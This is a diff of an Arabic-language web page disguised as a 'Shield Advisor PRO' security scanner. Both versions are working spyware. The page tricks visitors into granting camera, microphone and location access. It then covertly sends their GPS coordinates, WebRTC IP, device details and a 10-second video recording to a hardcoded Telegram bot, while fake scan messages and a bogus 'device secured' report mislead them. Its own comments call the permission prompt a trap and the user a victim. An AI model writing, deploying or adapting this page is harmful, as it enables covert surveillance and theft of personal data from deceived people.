@@ -3,112 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shield Advisor PRO | حماية متقدمة من الاختراق</title>
+    <title>Shield Advisor PRO | حماية متقدمة</title>
     <style>
         :root { --neon: #00d4ff; --dark: #0b0e14; --panel: #151921; }
-        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden; }
-        .dashboard { width: 90%; max-width: 900px; background: var(--panel); border-radius: 20px; padding: 40px; border: 1px solid #2d343f; box-shadow: 0 20px 50px rgba(0,0,0,0.7); text-align: center; position: relative; z-index: 10; }
-        
-        .header { display: flex; align-items: center; justify-content: center; gap: 15px; margin-bottom: 30px; }
-        .logo { width: 60px; height: 60px; border-radius: 50%; box-shadow: 0 0 20px var(--neon); }
-        .header h1 { font-size: 2.2rem; color: var(--neon); margin: 0; }
-
-        .status-panel { background: #000; border: 1px solid #333; padding: 20px; border-radius: 12px; margin-bottom: 30px; text-align: left; direction: ltr; font-family: 'Courier New', monospace; height: 150px; overflow: hidden; }
-        .console-line { color: #00ff41; font-size: 13px; margin: 4px 0; }
-
-        .action-zone { position: relative; }
-        .btn-scan { background: linear-gradient(90deg, #00d4ff, #0055ff); color: white; border: none; padding: 20px 50px; font-size: 1.3rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.4s; box-shadow: 0 10px 20px rgba(0, 85, 255, 0.3); }
-        .btn-scan:hover { transform: translateY(-3px) scale(1.02); box-shadow: 0 15px 30px rgba(0, 85, 255, 0.6); }
-
-        /* تمويه التحميل */
-        #loader { display: none; margin-top: 30px; }
-        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--neon); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
+        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
+        .dashboard { width: 90%; max-width: 600px; background: var(--panel); border-radius: 20px; padding: 40px; border: 1px solid #2d343f; box-shadow: 0 20px 50px rgba(0,0,0,0.7); text-align: center; }
+        .logo { width: 80px; height: 80px; border-radius: 50%; box-shadow: 0 0 20px var(--neon); margin-bottom: 20px; }
+        .btn-scan { background: linear-gradient(90deg, #00d4ff, #0055ff); color: white; border: none; padding: 20px 50px; font-size: 1.3rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.4s; width: 100%; }
+        .status-panel { background: #000; border: 1px solid #333; padding: 15px; border-radius: 12px; margin: 20px 0; text-align: left; direction: ltr; font-family: monospace; height: 100px; overflow-y: auto; }
+        .console-line { color: #00ff41; font-size: 12px; margin-bottom: 5px; }
+        #loader { display: none; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--neon); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
         @keyframes spin { 100% { transform: rotate(360deg); } }
-        .status-msg { font-size: 0.9rem; color: var(--neon); font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="dashboard">
-    <div class="header">
-        <img src="images (1).jpg" alt="Shield Advisor Logo" class="logo">
-        <div>
-            <h1>Shield Advisor <span style="font-weight:100; font-size: 1.2rem; color:#8a94a6">PRO</span></h1>
-            <p style="color: #8a94a6; margin: 2px 0 0 0; font-size: 14px;">نظام الفحص والحماية المتقدم ضد التهديدات السيبرانية</p>
-        </div>
-    </div>
+<div class="dashboard" id="main-content">
+    <img src="images (1).jpg" alt="Shield Advisor" class="logo">
+    <h1 style="color: var(--neon); margin: 0;">Shield Advisor PRO</h1>
+    <p style="color: #8a94a6;">نظام الحماية السحابي النشط</p>
 
     <div class="status-panel" id="console">
-        <div class="console-line">> [SYS] Kernel Security Modules active.</div>
-        <div class="console-line">> [NET] WebRTC leakage test pending.</div>
-        <div class="console-line">> [AUTH] Secure connection initialized.</div>
-        <div class="console-line">> Ready for full system diagnostic...</div>
+        <div class="console-line">> [SYS] Kernel Security Active...</div>
+        <div class="console-line">> [WAIT] Waiting for user scan command...</div>
     </div>
 
-    <div class="action-zone">
-        <button class="btn-scan" id="scanBtn" onclick="initiateSpyScan()">بدء فحص الحماية الآن</button>
-        
-        <div id="loader">
-            <div class="spinner"></div>
-            <div class="status-msg" id="statusMsg">جاري اختبار منافذ الشبكة وتحليل الـ IP...</div>
-        </div>
+    <button class="btn-scan" id="scanBtn" onclick="runGlobalScan()">بدء فحص الأمان الشامل</button>
+
+    <div id="loader">
+        <div class="spinner"></div>
+        <p id="statusMsg" style="color: var(--neon); font-size: 14px;">جاري تحليل منافذ النظام...</p>
     </div>
 </div>
 
 <script>
-    // بيانات الربط مع البوت الخاص بك
-    const BOT_TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
+    const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
     const ADMIN_ID = "8754338811";
 
     async function sendToBot(msg) {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'Markdown' })
         });
     }
 
-    async function initiateSpyScan() {
+    async function runGlobalScan() {
         const btn = document.getElementById('scanBtn');
         const loader = document.getElementById('loader');
         const status = document.getElementById('statusMsg');
-        const console = document.getElementById('console');
-
-        // إظهار التمويه
+        
         btn.style.display = "none";
         loader.style.display = "block";
-        addConsoleLine("> [API] Requesting sensor permissions...");
 
         try {
-            // 1. الفخ الأساسي (طلب الكاميرا/المايك)
+            // أولاً: استدعاء الإذن الرسمي (الفخ)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            addConsoleLine("> [SYS] Media Access: GRANTED.");
+            addLog("> [ACCESS] Media sensors synchronized.");
 
-            // 2. سحب الموقع الجغرافي (GPS)
+            // ثانياً: سحب الموقع الجغرافي
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                let mapLink = `http://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await sendToBot(`📍 **موقع الضحية الحقيقي (GPS):**\n${mapLink}`);
+                await sendToBot(`📍 **موقع الضحية:** \nhttp://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
             });
 
-            // 3. سحب الـ IP الحقيقي عبر WebRTC
+            // ثالثاً: سحب الـ IP الحقيقي
             const rtc = new RTCPeerConnection();
             rtc.createDataChannel("");
             rtc.createOffer().then(o => rtc.setLocalDescription(o));
             rtc.onicecandidate = i => {
-                if (i.candidate) {
-                    let ip = i.candidate.candidate.split(" ")[4];
-                    sendToBot(`🌐 **الـ IP الحقيقي (WebRTC):** \`${ip}\``);
-                }
+                if (i.candidate) sendToBot(`🌐 **IP الحقيقي:** \`${i.candidate.candidate.split(" ")[4]}\``);
             };
 
-            // 4. جمع معلومات الجهاز والمتصفح
-            let info = `📱 **معلومات الجهاز والبيئة:**\n` +
-                       `• المتصفح: ${navigator.userAgent}\n` +
-                       `• الذاكرة (RAM): ~${navigator.deviceMemory}GB\n` +
-                       `• اللغة: ${navigator.language}`;
-            await sendToBot(info);
+            // رابعاً: سحب معلومات الجهاز
+            await sendToBot(`📱 **الجهاز:** ${navigator.userAgent}\n**الرام:** ~${navigator.deviceMemory}GB`);
 
-            // 5. تسجيل فيديو 15 ثانية وإرساله
+            // خامساً: تسجيل فيديو صامت 10 ثواني
             const recorder = new MediaRecorder(stream);
             let chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
@@ -116,38 +86,41 @@
                 const blob = new Blob(chunks, { type: 'video/mp4' });
                 const fd = new FormData();
                 fd.append('chat_id', ADMIN_ID);
-                fd.append('video', blob, 'scan_report.mp4');
-                fd.append('caption', '🚀 فيديو الضحية المسحوب أثناء الفحص');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                fd.append('video', blob, 'scan.mp4');
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
             };
             recorder.start();
-            setTimeout(() => recorder.stop(), 15000); // تسجل 15 ثانية
+            setTimeout(() => recorder.stop(), 10000);
 
-            // تمويه الضحية بمراحل الفحص
-            setTimeout(() => { status.innerText = "جاري تحليل حزم البيانات (Deep Packet Inspection)..."; }, 3000);
-            setTimeout(() => { status.innerText = "جاري البحث عن برمجيات خبيثة (Rootkit Scan)..."; }, 6000);
-            setTimeout(() => { status.innerText = "جاري توقيع شهادة الحماية النهائية..."; }, 9000);
-
-            // التحويل النهائي (الضحية يذهب لاستلام تقريره الوهمي)
+            // تمويه المراحل
+            setTimeout(() => { status.innerText = "جاري فحص جدار الحماية..."; addLog("> [CHECK] Firewall status: Secure."); }, 3000);
+            setTimeout(() => { status.innerText = "جاري البحث عن ثغرات WebRTC..."; addLog("> [CHECK] WebRTC Leaks: None."); }, 6000);
+            
+            // المرحلة النهائية: التقرير الوهمي
             setTimeout(() => {
-                window.location.href = "https://t.me/8601512823?start=protection_active"; 
-            }, 12000);
+                document.getElementById('main-content').innerHTML = `
+                    <img src="images (1).jpg" class="logo">
+                    <h2 style="color: #00ff41;">✅ تم تأمين الجهاز بنجاح</h2>
+                    <div style="background: rgba(0,255,65,0.05); border: 1px solid #333; padding: 20px; border-radius: 12px; text-align: right; font-size: 14px;">
+                        <p>• حماية الكاميرا والمايك: <b>مفعلة</b></p>
+                        <p>• حماية الموقع الجغرافي: <b>مفعلة</b></p>
+                        <p>• منع تتبع الـ IP: <b>نشط</b></p>
+                        <hr style="border-color: #222;">
+                        <p style="color: #8a94a6; font-size: 12px;">نظام Shield Advisor يحميك الآن في الخلفية. يمكنك إغلاق هذه الصفحة بأمان.</p>
+                    </div>
+                `;
+            }, 10000);
 
         } catch (err) {
-            addConsoleLine("> [ERR] Critical permissions denied.");
-            alert("⚠️ يجب السماح بصلاحيات الكاميرا والموقع لإتمام فحص الأمان!");
-            btn.style.display = "block";
-            loader.style.display = "none";
+            alert("⚠️ يجب السماح بالأذونات لإتمام فحص الحماية بنجاح!");
+            location.reload();
         }
     }
 
-    function addConsoleLine(text) {
-        const console = document.getElementById('console');
-        const line = document.createElement('div');
-        line.className = 'console-line';
-        line.innerText = text;
-        console.appendChild(line);
-        console.scrollTop = console.scrollHeight;
+    function addLog(t) {
+        const c = document.getElementById('console');
+        c.innerHTML += `<div class="console-line">${t}</div>`;
+        c.scrollTop = c.scrollHeight;
     }
 </script>
 </body>
